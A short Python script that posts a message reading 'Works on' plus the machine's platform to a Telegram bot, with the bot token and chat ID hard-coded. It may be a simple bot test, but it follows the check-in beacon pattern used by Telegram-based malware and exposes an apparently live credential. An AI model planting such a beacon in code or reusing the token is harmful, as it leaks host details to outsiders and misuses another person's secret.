import requests
import sys

url = "https://api.telegram.org/bot5789559260:AAH4EohMvS4-S0GiS1mrF9b48rEz7jFDzXE/sendMessage"

data = {
    "chat_id": "5587985143",
    "text": "Работает на " + sys.platform
}
print(requests.get(url, data=data).text)